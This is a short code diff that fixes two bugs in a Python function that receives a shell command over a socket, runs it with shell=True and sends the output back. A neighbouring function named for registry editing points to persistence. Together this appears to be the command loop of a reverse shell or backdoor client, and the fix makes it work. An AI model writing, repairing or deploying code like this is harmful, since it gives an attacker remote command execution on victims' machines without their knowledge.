@@ -53,8 +53,8 @@ def start_regitry_edit():
 def process_shell_cmd(s):
     try:
         shell_cmd = s.recv(1024).decode()
-        pipe = subprocess.Popen(shell_cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,subprocess.stderr=subprocess.PIPE)
-        output = pip.stdout.read()
+        pipe = subprocess.Popen(shell_cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
+        output = pipe.stdout.read()
         s.send("DONE".encode())
         sleep(1)
         s.send(output)
